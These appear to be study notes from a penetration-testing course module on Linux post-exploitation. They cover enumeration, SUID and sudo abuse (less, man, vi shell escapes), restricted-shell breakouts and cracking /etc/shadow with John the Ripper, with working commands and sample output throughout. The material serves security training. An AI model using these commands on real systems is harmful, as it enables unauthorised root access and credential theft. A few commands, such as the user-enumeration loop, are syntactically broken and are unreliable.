# [ECPPT](https://members.elearnsecurity.com/courses/penetration_testing_professional_v5)
___________________________________
# Linux Exploitation
# Module 4 - Post Exploitation

https://cdn.members.elearnsecurity.com/ptp_v5/section_4/module_4/html/index.html

###### Module Map
1. Privilege Escalation
2. Lateral Movement
3. Data Exfiltration
4. Maintaining Access
___________________________________
At this stage, you have conducted your initial enumeration, have been able to use the acquired information to obtain access to several machines, and now it is time to move into the post-exploitation phase.

It is in this phase of testing where we:
- Perform additional information gathering and enumeration of any systems from a local perspective (shell, console, etc.)
- Elevate our privileges
- Maintain a foothold
- Pivot to other systems and
- Utilize methods to exfiltrate data

Our first task is to gather additional information about the system, including users, permissions, installed applications, how software is configured, and other things  about the system which will help us in our quest for root.

As we have learned from the Information Gathering (Local Enumeration) module of this lesson, there are many commands and things we can do once we have gotten access to a Linux machine.

We will review some of those methods in greater depth for this module.

The process for post-exploitation can be broken down into several distinct categories, which can be further broken down into sub-categories.
- Additional Information Gathering
- Privilege Escalation
- Lateral Movement
- Data Exfiltration
- Maintaining Access

___________________________________
## 4.1. Privilege Escalation
In regards to gathering information related to Privilege Escalation, once access to a host has been obtained there are several sub-categories we can use to distinguish the different types of information we will gather.

This information can be generally divided as follows:
- System and Network Information
- User Information
- Privileged Access / Cleartext Credentials
- Services
- Job/Tasks
- Installed Software Version Information

#### 4.1.1. System and Network Information
  - Hostname
    - Does the hostname reveal anything about the systems' function? <br>
    Can we leverage that information to gain access to function-related information?
    - Related Command : `hostname`
  - Kernel Version
    - Is the kernel vulnerable to any exploits?
    - Related Command: `uname -a`
  - Operating System
    - Does our current OS have any known exploitable vulnerabilities?
    - Related Command: `cat /etc/issue`
  - IP address
    - Related Command: `ifconfig`
  - Running Processes
    - Related Command: `ps auxw`
  - Network Routes
    - Is our currently compromised machine routed to other networks?<br>
      Can we use this information to pivot?
    - Related Command: `route -n`
  - DNS server
    - Can we obtain information from the DNS server? <br>
      Active Directory Accounts, Zone Transfers, etc.
    - Related Command: `cat /etc/resolv.conf`
  - ARP Cache
    - Have other machines communicated with another target? <br>
      Are the other machines accessible from the target?
    - Related Command: `arp -a`
  - Current Network Connections
    - Are there any established connections from our machine to other machines and vice versa? <br>
      Are the connections over encrypted or non-encrypted channels? <br>
      Can we sniff the traffic of those connections?
    - Related Command: `netstat -auntp`
#### 4.1.2. User Information
  - Current User Permissions
    - Can our current user access sensitive information/configuration details that belong to other users?
    - Related Command: `find / -user username`
  - UID and GID Information for All Users
    - How many users on the system? <br>
      What groups do users belong to? <br>
      Can we modify files belonging to users in other groups?
    - Related Command:
    `for user in $(cat /etc/passwd) | cut -f1 -d":"; do id $user; done`
  - Last Logged on Users
    - Who has been on the system? <br>
      From what systems? <br>
      Can we pivot to those other systems using credentials we might already have?
    - Related Command: `last -a`
  - Root Accounts
    - How many UID 0 (root) accounts are on the system? <br>
      Can we get credentials for any of them?
    - Related Command:
    `cat /etc/passwd | cut -f1,3,4 -d":" | grep "0:0" | cut -f1 -d":" | awk '{print $1}'`
  - Service Accounts
    - Do any of the service accounts (i.e., www-data) have shells defined? <br>
      Can we log in as those accounts?
    - Related Command: `cat /etc/passwd`
  - Home Directories
    - Do we have access to other users' home directories? <br>
      Is any of the information contained in those directories useful to use?
    - Related Command: `ls -als /home/*`
#### 4.1.3. Privileged Access / Cleartext Credentials
  - Can the current user execute anything with elevated privileges?
    - Related Command: `sudo -l`
  - Are there any setuid root (SUID) ninaries on the system which may be vulnerable to privilege escalation?
    - Related Command: `find / -perm -4000 -type f 2>/dev/null`
  - Can we read configuration files that might contain sensitive information, passwords, etc.?
    - Related Command: `grep "password" /etc/*.conf 2>/dev/null`
  - Can we read the shadow file? If so, can we crack any of the hashes?
    - Related Command: `cat /etc/shadow`
  - Can we list or read the contents of the `/root` directory?
    - Related Command: `ls -als /root`
  - Can we read other users' history files?
    - Related Command: `find /* -name *.history* -print 2>/dev/null`
  - Can we write to directories that are configured to serve web pages?
    - Related Command: `touch /var/www/file`
#### 4.1.4. Services
  - Which service are configured on the system and what ports are they opening?
    - Related Command: `netstat -auntp`
  - Are service configuration files readable or modifiable by our current user?
    - Related Command: `find /etc/init.d ! -uid 0 -type f 2>/dev/null | xargs ls -la`
  - Can we modify the configuration of a service in such a way that gives us elevated privileges?
  - Do the configuration files contain any information we can use to our advantage? (i.e. credentials, etc)
    - Related Command: `cat /etc/mysql/my.cnf`
  - Can we stop or start the service as our current user?
    - Related Command: `service service_name start/stop`
  - What actions take place as a result of being able to stop and start service?

#### 4.1.5. Job/Tasks
  - What tasks or job is the systems configured to run and at which times?
    - Related Command: `cat /etc/crontab`
    - Related Command: `ls -als /etc/cron.*`
  - Are there any custom jobs or tasks configured as root that world-writeable?
    - Related Command: `find /etc/cron* -type f -perm -o+w -exec ls -l {} \;`
  - Can we modify any of the existing tasks at all?
    - Related Command: Try and modify cron jobs

#### 4.1.6. Installed Software Version Information
  - What software packages are installed on the system?
    - Related Command: `dpkg -l`
  - What versions? Are the versions installed out-of-date and vulnerable to existing available exploits?
    - Related Command: `dpkg -l`
    - Related Command: `searchsploit "httpd 2.2"`
  - Does any of the installed software allow us to modify their configuration files and could this result in gaining privileged access to the system?
    - Related Command: Try and modify package configurations

Much of the information previous information (and more) can be gathered either manually or through the use of automated tools, which is a bit more time efficient when on an engagement.

#### LineEnum and NetCat
One particular tool of note is [LinEnum](https://github.com/rebootuser/LinEnum)
  LinEnum will automate much of the information gathering and enumeration phase for us, and there are also a great number of resources available  to use as a interface for commands regarding the information gathering and enumeration process as it related to post-exploitation.
  Below are just a couple great resources we can use to help with this process:
  - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
  - https://www.rebootuser.com/?p=1623

  In order to utilize LinEnum once on a system, we will need to download it onto the target.

  Now assuming `wget` is installed on our target, we can use that to download the shell script directly from Github:
    ```
    wget https://raw.githubusercontent.com/rebootuser/LinEnum/msater/LinEnum.sh
    ```

In case you are unable to download LinEnum onto the target host, (perhaps wget is not on the system, or your connectivity to the internet is restricted) you can simply copy and paste the contents of the script into a new file on the system.

Or, you can use netcat if available on the target to transfer the file from your attacker system to the target:

  On Target Machine:
  ```
  nc -l -p 1234 > LinEnum.sh
  ```
  On Attacker Machine:
  ```
  nc -w 3 <target_ip> 1234 < LinEnum.sh
  ```

  The above netcat file transfer method sets up a listener on the target to redirect incoming data (>) to a new file, while on the Attacker machine, we connect to our target system while redirecting the contents of LinEnum.sh to the target.

  An important note about transferring files via netcat is that all traffic is unencrypted and may be detected by Intrusion Detection Systems or other anomalous traffic detection mechanisms implemented within an organization.

  It is a quick, easy way to get files from one system to another, but not stealthy in any way. We will cover alternative methods of transferring files and exfiltrating data over encrypted channels later in this module.

#### 4.1.1. Cleartext Credentials in Configuration Files
- `LinEnum`
Once we have downloaded the shell script or copied LinEnum to our target system, make sure that we set the executable bit with:
  ```
  chmod +x LinEnum.sh
  ```

Running Linenum with the `-h` switch shows us some of the options available with this tool:
  ```
  todd@server2:~# ./LinEnum.sh -h
  ./LinEnum.sh: option requires an argument -- h

  #########################################################
  # Local Linux Enumeration & privilege Escalation Script #
  #########################################################
  # www.rebootuser.com | @rebootuser
  # version 0.7

  # Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t

  OPTIONS:
  -k      Enter keyword
  -e      Enter export location
  -t      Include thorough (lengthy) tests
  -r      Enter report name
  -h      Displays this help text
  ```
  Using the `-k` (keyword) option, **we can have LinEnum search configuration files for a string**, such as `password`. This can often reveal credentials for other services which we can use for further exploitation.

- `grep`, `find`, `cat` (information got not identical to above)
Alternatively, we can get similar results manually by using the `grep` command like so:
  ```
  grep -r password /etc/*.conf 2> /dev/null
  ```

  The above grep command will **search** the `/etc` directory recursively (`-r`) for all `.conf` files containing the string `password` while sending errors to `/dev/null`.
  Experiment with the above grep command and look for other interesting string in other file types that could be used to potentially gain elevated privileges.

As we mentioned, there are a number of additional useful one-liners and commands we can use to help us gather information from Linux systems.
If successful, they can help us get root access or other types of access, as seen with the command below, but also make sure to reference the supplied Post Exploitation Command Sheet provided with this module for more.
  Find dotfiles with **history** in their names (i.e., `.bash_history`)
    ```
    find /* -name *.*history* -print 2> /dev/null
    ```
  Grep the apache access.log file for **user** and **pass** strings
    ```
    cat /var/log/apache/access.log | grep -E "^user|^pass"
    ```
  Dump cleartext Pre-Shred Wireless Keys from Network Manager
    ```
    cat /etc/NetworkManager/system-connections/* | grep -E "^id|^psk"
    ```

  **Consider the following scenario:**
    An administrator has configured a web server which uses a MySQL backend database.

    You have exploited the web server through a vulnerable PHP page, and now have access to the system as a restricted `www-data` user and can execute system commands as that user.

    We have also determined through listing running processes on the system that the MySQL daemon is running as root.

    This is a perfect opportunity to use our access as the `www-data` user to search for any PHP files or MySQL configuration files which might contain credentials to the database.

    **Those credentials, if found, can then be used to obtain access to the MySQL database, and depending on its configuration, can give us the ability to execute system commands as root**, such as is possible with [Command Execution via User-Defined Functions](https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html) (UDF)

- MSF Modules
In addition to using LinEnum and manual commands to gather information from a system locally, another method we can use to download configuration files from the target system (assuming you already have a shell on the system via a Metasploit session), is to use Metasploit's `enum_configs` post module, which can be loaded with:
  ```
  msf> use post/linux/gather/enum_configs
  msf post(linux/gather/enum_configs)> set SESSION 1
  msf post(linux/gather/enum_configs)> run
  ```

  Once you configure your `SESSION` value and `run` the module, it will download the most common configuration files into your `~/.msf4/loot/` directory.

Another Metasploit post module for Linux you will find useful is the `enum_system` module.
  `enum_system` will gather Linux versions, User accounts, Installed Packages, Cron jobs, and more from an existing Metasploit shell session.

Lastly, there are also several other Metasploit post modules we can use for post-exploitation of a Linux system. Experiment with these modules to see how they can help you further exploit a Linux.
  Lists all modules on `post/linux`
  ```
  msf > use post/linux
  ```

#### 4.1.2. SUID Binaries
[SUID](https://en.wikipedia.org/wiki/Setuid) or *setuid* executables are a blessing in disguise when it comes to privilege escalation opportunities. Executable files with the *setuid* atrribute assigned, when executed, are run as the owner ([EUID](https://en.wikipedia.org/wiki/User_identifier#Effective_user_ID) or Effective User ID) of the file regardless of the current users' privileges.

Below, we can see root is the owner of the `/bin/ping` binary, and it is also configured with the `setuid` attribute.
  ```
  root@server2:~# ls -als /bin/ping
  60 -rwsr-xr-x 1 root root 61240 Nov 10 2016 /bin/ping
  root@server2:~#
  ```

  The reason that `ping` is configured as a SUID root binary, is that `ping`, by its very nature uses [raw sockets](https://en.wikipedia.org/wiki/Network_socket#Raw_socket) to generate and receive ICMP packets and that activity requires root access.

  The `passwd` executable, responsible for enabling users to change their passwords, is also SUID root, due to the fact that it needs to write to the `/etc/passwd` and `/etc/shadow` files.

There are several other well-known SUID root binaries, as they all require some sort of elevated permissions to perform a function, and some of the most common you will find on Linux systems are:
  ```
  /bin/su
  /bin/mount
  /usr/bin/sudo
  /usr/bin/passwd
  /usr/bin/chsh
  ```

**Finding SUID Binaries**
  We can use the following `find` command to search for all SUID executable files on a Linux system:
    ```
    find / -perm -4000 -type f 2>/dev/null
    ```

    The above command is executing `find` on the root directory (`/`), looking for regular executable files (`-type f`) with the `setuid` permission (`-perm -4000`) set, and sending all errors (`2`) to `/dev/null`

So we know that SUID root binaries are executed as root regardless of our current users' permission.
That is great, but how do we exploit that to get a root shell?

  The issue arises when we find a SUID root executable that takes some form of user input that is not properly checked or sanitized, which could result in a buffer overflow within that binary, resulting in our code (input) being executed as root.

  Another scenario could simply be a SUID root binary that just takes an argument as a command to execute, or takes an argument as a file to read, etc.

**SUID Modcat Example**
  Let's take a look at the following C code of a file we will call *modcat* (essentially a wrapper for the cat command), as an example:
    ```
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>

    int main(int argc, char ** argv){
      if (argc<2){
        print("Reads a file. No file name provided.\n");
      } else{
        execv("/bin/cat", argv);
        perror("exec");
      }
    }
    ```
    The above code, when compiled, simply takes a single argument (`argv`) (a file in this case) and executes (`execv`'s) the `/bin/cat` command on it.

    In other words, after the code is compiled, a typical command line for our *modcat* would look something like:
      ```
      $ modcat /etc/passwd
      ```
    Which would simply print (`cat`) the contents of the `/etc/paswd` file:
      ```
      root@server2:~# modcat /etc/passwd
      root:x:0:0:root:/root:/bin/bash
      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
      bin:x:2:2:bin:/bin:/usr/sbin/nologin
      ```

    That is great, as any user should be able to read the `/etc/passwd` file naturally, and we can see the executable works as expected. It prints out the contents of a file supplied as an argument.

  Now consider that an administrator has given the same executable the SUID attribute, and is owned by root:
    ```
    bob@server2:~$ ls -als /usr/local/bin/modcat
    12 -rwsr-xr-x 1 root staff 8520 Jan 12 12:22 /usr/local/bin/modcat
    ```

  Of course, now we can execute `modcat` to display the contents of `/etc/shadow` (a file only root should be able to read), since the binary will run as root due to the *setuid* bit being set, and it being owned by root:
    ```
    bob@server2:~$ modcat /etc/shadow
    root:$6&EN3zSSU/$cSFDGdrNFskJyKmUCSit3fRlxvcMOnTCFqhWwPU/M.5x
    MXUtE6qWTJyrmQk/:17518:0:99999:7:::
    daemon:*:17479:0:99999:7::::
    bin:*:17479:0:99999:7::::
    sys:*:17479:0:99999:7::::
    sync:*:17479:0:99999:7::::
    games:*:17479:0:99999:7::::
    ```

  The above `modcat` example can be trivially exploited to obtain root access to a system.
    How that can be accomplished exactly, is left as an exercise and can be found in the Lab.

**SUID Modcat Example**
  Another example of a setuid binary sometimes found on Linux systems is Nmap.
  Older versions of Nmap contained an interactive *shell*, which could be launched via the `--interactive` switch.

  Once in interactive mode, and assuming the Nmap executable was SUID root, simply running `!sh` in the interactive nmap console would land the user a root shell.

**glibc '$ORIGIN' Expansion Privilege Escalation**
  An interesting example related to SUID executables discovered by Tavis Ormandy of Google's Project Zero, exploits the GNU C Library Dynamic Linker (Glibc) versions before 2.11.3 and 2.12.x versions up to 2.12.1 and takes advantage of glibc's failure to restrict the use of the LD_AUDIT environment variable when loading SUID executables which controls the [$ORIGIN library search path](https://enchildfone.wordpress.com/2010/03/23/a-description-of-rpath-origin-ld_library_path-and-portable-linux-binaries/)

  Ultimately resulting the execution of an arbitrary shard object (`.so` file).

  Although this vulnerability was [initially disclosed in 2010](http://seclists.org/fulldisclosure/2010/Oct/257), a Linux exploit module was [added to Metasploit](https://github.com/rapid7/metasploit-framework/commit/0ba37f8104a756531a8aa0476fc28752e376cd73#diff-bd65d6882264a406ab376d3abd0bce6e) January of 2018 and also provides a good example of other ways that privilege escalation can be obtained through the exploitation of environment variables, related to SUID executables.

  Read more about the specifics [here](http://seclists.org/fulldisclosure/2010/Oct/257)

  If you would like to experiment with this on a Linux system with a vulnerable version of glibc, you can load the Metasploit module with:
    ```
    msf > use exploit/linux/local/glibc_origin_expansion_priv_esc
    ```

#### 4.1.3. Sudo Privileges Access
`sudo` misconfigurations are another important finding as it relates to privilege escalation.

Sudo is used to provide privileges access to users on a temporary basis, allowing users to run commands as another user (usually as root), and when that elevated access is required, a user can simply run `sudo command`.

In order for a user to be able to utilize `sudo`, a change is required in the `/etc/sudoers` configuration file.

  The following is a snapshot of a typical `/etc/sudoers` file without any modifications:
    ```
    ...
    # User privilege specification
    root    ALL=(ALL:ALL) ALL
    # Allow members of group sudo to execute any command
    %sudo   ALL=(ALL:ALL) ALL
    ...
    ```
  After modifications for the user Bob:
    ```
    ...
    # User privilege specification
    root    ALL=(ALL:ALL) ALL
    bob     ALL=(root) NOPASSWD: /bin/less /var/log/*
    bob     ALL=(root) NOPASSWD: /usr/bin/man
    # Allow members of group sudo to execute any command
    %sudo   ALL=(ALL:ALL) ALL
    ...
    ```

Please note that a standard user will typically not be able to view the `/etc/sudoers` file directly. However, we can retrieve our sudoers status once we are on a system with `sudo -l` command:
  ```
  bob@server2:~$ sudo -l
  Matching Defaults entries for bob on server2:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

  User bob may run the following commands on sever2:
      (root)  NOPASSWD: /bin/less /var/log/*
      (root)  NOPASSWD: /usr/bin/man
  bob@server2:~$
  ```

  From the output from the previous slide, we can see that `bob` can `sudo` and `less` on any files in the `/var/log/` directory, in addition of being able to sudo the `man` command.

  We can also see that the commands defined for `bob` will be run as `root`, and furthermore, won't require `bob` to enter a password for either of those commands as well, as we can see the `NOPASSWD` directive specified.

At first glance, the above-allowed commands for `bob` may not seem like a big deal, but let's examine this a bit more and see how we could exploit those to get root-level access on the machine.
  Both `less` and `man` commands, among many others, if found in an `/etc/sudoers` file, can be exploited to get root.

**Shell Escape via Less**
  Let's first examine the `less` program itself.

  If we take a look at its `man` entry, we can see that as part of its functionality, it allows a user to execute shell commands (shell escape) with the `!` (shell-command):
    ```
    man less
    ```
    ```
    ...
    ! shell-command
      Invokes a shell to run shell-command given.
      ...
    ...
    ```

  This allows the user to execute shell commands from inside `less`.

  As an example, here is a regular user running the `less /var/log/Xorg.1.log` command, typing the `!id` shell-command:
    ```
    bob@server2:~$ less /var/log/Xorg.1.log
    ```
    ```
    ...
    !id
    ```
    ```
    bob@server2:~$ less /var/log/Xorg.1.log
    uid=1001(bob) gid=1001(bob) groups=1001(bob)
    !done (press RETURN)
    ```

  We can see from the above that we executed the `!id` command, from `less`, and it returned the current users' UID/GID information.

  We can see where this is going! (root ofc)

  If our user is in the `/etc/sudoers` file and can execute `less` on certain files (as root), in this case, any file in `/var/log/*`; `less` will effectively be executed as `root`.

  We can see what happens when we `sudo` the `less` program and execute `!sh` command to escape the shell, followed by the `id` command to check our UID/GID information.
    ```
    sudo less /var/log/Xorg.1.log
    ```
    ```
    ...
    !sh
    ```
    ```
    # id
    uid=0(root) gid=0(root) groups=0(root)
    #
    ```

  There are many examples of binaries on Linux that allow the user to execute shell commands, `less` being one of them.

  `vi`/`vim` editors also allows breaking out into a shell via the `!sh` method or executing any shell commands for that matter.

A list of some common executables, if they are present in the sudoers file, can give us root shells through different means.
The below commands (`!sh`) are sometimes referred to as "shell escapes" and are executed from withtin the executable themselves:
- less (`!sh`)
- more (`!sh`)
- vi/vim (`:!sh`)
- nmap (`--interactive` + `!sh`)
- ftp (`!sh`)
- gdb (`!sh`)
- python
- perl
- lrb
- lua

Aside from programs that allow shell commands to be executed with the `!` feature, many others also exist, that with some experimentation and exploration, also allow the execution of arbitrary shell scripts or commands when passed as arguments via the command line.

**"Man" Arbitrary Command Execution via Pager Argument**
  For instance, the `man` program, short for "manual", is essentially the command reference guide built into the Linux OS.

  We use `man` to view "man pages" when we need to reference a particular program. If we want the man page for the `id` program, we simply call `man id`

  The `man` program usually utilizes the `more` and `less` programs to display its pages depending on its configuration. The programs it uses for this purpose is known as `pager`, and can be specified with the `-P` switch when running `man`. If we look at the man page for `man` (`man man`), we can see what the `pager` option is about:
    ```
    Controlling formatted output
        -P pager, --pager=pager
              Specify which output pager to use. By default, man uses pager.
              This option overrides the $MANPAGER environment variable, which in turn overrides the $PAGER environment variable. It is not used in conjunction with -f or -k.  

              The value may be a simple command name or a command with arguments, and may use shell quoting (backslashed, single quotes, or double quotes). It may not use pipes to connect multiple commands; if you need that, use a wrapper script, which may take the file to display either as an argument or on standard output.
    ```

  Due to a quirk in the `man` program and how it handles the `pager` (`-P`) argument, we can run a commands that we want; for example, we will tell man to run the `id` command to display our UID and FID information:
    ```
    man -P "id" man
    ```
    ```
    bob@server2:~$ man -P "id" man
    uid=1001(bob) gid=1001(bob) groups=1001(bob)
    bob@server2:~$
    ```
    We can see that we were able to coerce `man` with the `-P` switch to launch our `id` command as the `pager` in this case.

  Now considering the previous example of the commands `bob` is allowed to execute via `sudo`, one of which was `man`. We can use that `pager` quirk to read the `/etc/shadow` file, or execute whatever we want as root (through `man`):
    ```
    sudo man -P "cat /etc/shadow" man
    ```
    ```
    bob@server2:~$ sudo man -P "cat /etc/shadow" man
    root:$6&EN3zSSU/$cSFDGdrNFskJyKmUCSit3fRlxvcMOnTCFqhWwPU/M.5x
    MXUtE6qWTJyrmQk/:17518:0:99999:7:::
    daemon:*:17479:0:99999:7::::
    bin:*:17479:0:99999:7::::
    sys:*:17479:0:99999:7::::
    sync:*:17479:0:99999:7::::
    games:*:17479:0:99999:7::::
    ```

**Docker Sudo Privilege Escalation**
  Although privilege escalation vectors related to Sudo have existed since the inception of the Linux OS, one of the more recent examples of a Sudo exploit requires that [Docker](https://en.wikipedia.org/wiki/Docker_(software)), a popular virtualization software that utilizes containers is installed on the target system and is also defined as an entry for a user in the `/etc/sudoers` file to be executed as root similar to how we have seen in the previous `sudoers` entries.

  This particular vulnerability exploits Docker by compiling shellcode for a root shell within a container, sets the SUID attribute on the exploit binary, and then launches a root shell.

  You can find more information about the Docker Sudo exploit [here](https://github.com/pyperanger/dockerevil)

#### 4.1.4. Restricted Shells
[Restricted shells](https://en.wikipedia.org/wiki/Chroot) are another topic we should become familiar with, as they are encountered in the field often in hardened environments where users require access to server, but the administrators would like to limit the commands that users on the system can execute.

You may be more familiar with the term [chroot jail](https://en.wikipedia.org/wiki/Chroot) when it comes to restricted shells.

A chrooted jail is a way to isolate users and users' processes from the rest of the OS.

All programs defined for a chroot jail are run in their own directory structure, with their own shared libraries and environment settings.

One of the more common implementations of restricted shells utilized `rbash` shell, which would be the shell defined for a user once logged on to a machine through pre-defined environment variables.

`rbash` when combined with chroot hail, can be rather effective; however, many times, administrators rely on rbash alone, which opens up several ways we can break out of the restricted shell.

When the `rbash` shell is defined for users, some commands that are usually restricted are:
- The ability to change into other directories (`cd`)
- Specifying absolute path names or files containing a (`/`) or (`-`)
- Setting or unsetting the PATH environment variable
- Using ENV or BASH_ENV for setting or unsetting other environment variables
- Using bash output redirection operators (`>`, `>>`, `>|`, `<>`, `>&`, `&>`)
- Disabling restricted mode using the `set +r` or `set +o restricted` commands

How to tell you are in a restricted shell
  You can usually tell you are in a restricted shell when you start seeing "restricted" errors when you attempt to execute usual commands like `cd`:
    ```
    $ cd
    rbash: cd: restricted
    ```

  Or when trying to redirect the output of a command to a file:
    ```
    $ id > id.txt
    rbash: id.txt: restricted: cannot redirect output
    ```

  One of the first things we can do to confirm we are in a restricted shell is to run the `ENV` command to get a better understanding of how your environment is configured and what your current shell is.

  Specifically, your `$PATH` and `$SHELL` environment variables:
    ```
    $ ENV
    ...snip...
    WINDOWPATH=2
    VTE_VERSION=5001
    SHELL=/bin/rbash
    TERM=xterm-256-color
    ...snip...
    XDG_RUNTIME_DIR=/run/user/0
    XAUTHORITY=/run/user/0/gdm/Xauthority
    PATH=/var/chroot/bin
    GJS_DEBUG_TOPICS=JS ERROR;JS LOG
    ```

    In this snapshot, we can see that our `SHELL` environment variable is set to `/bin/rbash` and our `$PATH` is also confined to the `/var/chroot/bin` directory.

  Combined with the `restricted` errors we are seeing, and an inability to run some typical shell commands, we can be sure we are in a restricted shell.

There are a great number of things we can try to break out of this restricted shell, and we will cover several methods, and leave others up to the imagination and creativity of the individual.
  We have previously covered several programs (`less`,`vim`,`nmap`,etc.) that offer the ability to escape into a shell with the `!` method.

  Those certainly can be used to attempt to get out of our restricted shell, assuming of course that your restricted shell allows you to run those binaries in the first place.

  **Restricted Shell Escape with Vi/Vim**
    An example restricted shell escape with the `vi` or `vim` editor would be to open a file, and then run `:!sh` and then `<enter>` inside `vi`:
      ```
      vi /tmp/test
      ```
      ```
      ~
      ~
      ~
      :!sh
      [No write since last change]
      sh-3.2$ _
      ```

      The results in getting us a regular `/bin/sh` shell outside of our restricted `rbash` shell as seen in the above example.

  **Restricted Shell Escape with Vi/Vim**
    Another trick we can use to break out of a restricted shell is with the `find` command coupled with the `-exec` argument:
      ```
      find /home/bob -name test -exec /bin/sh \;
      ```
      ```
      bob@server2:~$ find /home/bob -name test -exec /bin/sh \;
      $ id
      uid=1001(bob) gid=1001(bob) groups=1001(bob)
      $
      ```

      The above find commands is looking for a file named "test" (`-name test`) in the `/home/bob` directory, and if found, will execute whatever follows the (`-exec`) switch.

    Note: The above find trick will only work if the file "test" exists in the specified path (/home/bob). If it doesn't exist, search for a known file, or create a file if needed.

  **Restricted Shell Escape with Python or Perl**
    Although it may not be likely that you will be able to execute Python, Perl, IRB, etc, while in a restricted shell, but if you find that you can, we can use those to break out as well:
    - Python
      The below Python command spawns what is known as a pseudo-TTY and can also be very useful when an interactive TTY is needed after the result of an exploit, especially with Metasploit-based Linux reverse_tcp or bind_shell payloads
      ```
      bob@server2:~$ python -c 'import pty; pty.spawn("/bin/sh")'
      $ id
      uid=1001(bob) gid=1001(bob) groups=1001(bob)
      ```
    - Perl
      ```
      bob@server2:~$ perl -e 'exec "/bin/sh";'
      $ id
      uid=1001(bob) gid=1001(bob) groups=1001(bob)
      ```
  **Restricted Shell Escape with SSH**
    If we have SSH credentials to a system for a user that is configured with restricted shell, we can try and break out the shell remotely form another system by trying to execute a shell with SSH before the restricted shell is initialized on the target.
    ```
    ssh restricted_user@targetserver -t "/bin/sh"
    ```

  There are [many ways](https://www.google.com/search?q=%22Restricted+shell%22+++%22pentesting%22&oq=%22Restricted+shell%22+++%22pentesting%22) we can escape the restricted shell.

  Sometimes al it takes is some creativity, digging a little bit deeper, and making sure we are comprehensively enumerating our target.

#### 4.1.5. Cracking the Shadow
You have exploited a machine, have a Metasploit session, or a reverse shell on the system as `root`, through a web-based or other exploit, but don't have any valid credentials to try and move laterally to other systems re-using credentials from a user that exists on your currently exploited machine.

  Sometimes a shell is not enough, and we require credentials to further our objectives, move laterally from one machine to another, masquerade through a network using valid credentials, etc.

In the event we have a shell on a machine as root, there are several things we can do to obtain some basic credentials.
  One of those involves cracking the password hashes in the `/etc/shadow` file.

  The [/etc/passwd](https://en.wikipedia.org/wiki/Passwd) and [/etc/shadow](https://en.wikipedia.org/wiki/Passwd#Shadow_file) files are responsible for maintaining the database of users on a Linux system and are directly manipulated by the `/usr/bin/passwd` program among other programs whenever changes are made to any existing users or passwords.

Some Unix passwd History:
  Before the mid-80's, both username and passwords were stored in a single file, the `/etc/passwd` file.

  In an effort to better secure the file from dictionary and brute force attacks against the hashes by any user, developers introduced **shadowing** of the passwords via a separate file.

  The `/etc/shadow` file we know today is only readable by root and the SUID root `/etc/passwd` program.

  The `/etc/passwd` files stores general user information including current home directory, UID value, GID, login shell, and any descriptive information for a particular user, and can be read by any standard user.
    Snippet of several `/etc/passwd` entries:
    ```
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    ```

  Whereas the `/etc/shadow` file stores the users' passwords in a hashed format, in addition to other things such as password expiration information, whether the user is required to change their password on next logon, min/max time between password changes and several other parameters.
    The password hash is always the second field after the username.
    The fields are separated by colon (:).
    ```
    root:$6$EN3zSSU/$cSFDGdrNFskJyKmUCSit3fRlxvcMOnTCFqhWwPU/M.5x
    MXUtE6qWTJyrmQk/:17518:0:99999:7:::
    daemon:*:17479:0:99999:7::::
    bin:*:17479:0:99999:7::::
    sys:*:17479:0:99999:7::::
    sync:*:17479:0:99999:7::::
    games:*:17479:0:99999:7::::
    ```

    The `/etc/shadow` file can only be read by root, the `passwd` program along with several other programs that require the ability to modify the `/etc/passwd` and `/etc/shadow` files.

    In the current versions of Linux, the hashes in the shadow file are stored as [SHA-512](), and can be quickly recognized by the `$6$` at the beginning of the hash as seen in the following `/etc/shadow` entry:
      ```
      root:$6$EN3zSSU/$cSFDGdrNFskJyKmUCSit3fRlxvcSMOnTCFqhWw0.5x
      MXUtE6qWTJyrmQk/:17518:0:99999:7:::
      ```
    Older versions may be using SHA-256 or MD5 which can be identified by `$5$` and `$1$` respectively.

Once we have gotten a shell and are either able to execute commands as root, or we are root for that matter, we can execute a dictionary attack against the hashes in the `/etc/shadow` file.
  Consideration must be taken in regard to whether or not the hashes are using SHA-512, SHA-256, or MD5.
    MD5 (`$1$`) hashes will be easiest to crack.

    Depending on the complexity of the password,  SHA-256 (`$5$`) and SHA-512 (`$6$`) may be a bit more difficult.

    In all cases, if the password is weak, we can likely crack it regardless of the hashing algorithm.

###### 4.1.5.1. Unshadow and John The Ripper
Another point to note is that we will want to crack the hashes offline once both the `/etc/passwd` and `/etc/shadow` files are copied to our attacker system. There are several reasons for this:
- We make less noise on the target system
- Our target likely doesn't have the tools we need to crack the hashes
- Perhaps we require a machine with more processor power to launch our dictionary attack

Once we have gotten copies of those 2 files, we can use a tool known as `unshadow` along with the [John The Ripper](http://www.openwall.com/john/) password cracking tool to crack the hashes. Unshadow is distributed with John the Ripper.

Unshadow takes both the `/etc/passwd` and `/etc/shadow` files and combines them into a format compatible for cracking with John. The unshadow command we can use to combine the 2 files is straightforward:
  ```
  $ unshadow passwd shadow > shadow.john
  ```

  In the above example, we are supplying both the `passwd` and `shadow` files as arguments to the unshadow program, and outputting the results to a new file called `shadow.john`

  The result is a file that is a combination of both the `passwd` and `shadow` files:
    ```
    $ cat shadow.john | grep root
    ```
    ```
    root:$6$EN3zSSU/$cSFDGdrNFskJyKmUCSit3fRlxvcSMOnTCFqhWw0 :root:/root:/bin/bash
    ```

    We can see that the resulting `shadow.john` file contains both the root hash, as well as roots' home directory, and shell information.

We can now take our `shadow.john` file, and run it through John in conjunction with a favorite word list.
  John should have no problem identifying the hash-type (SHA-512 in this case), and cracking the password taking into consideration that a weak or known password is being used:
    ```
    $ john shadow.john --wordlist=/usr/share/wordlists/custom_words.txt
    ```
    ```
    Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
    Use the "--format=crypt" option to force loading these as that type instead
    Using default input encoding: UTF-8
    Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3)) $6$ [SHA512 128/128 AVX 2x])
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Password01!     (root)
    ```

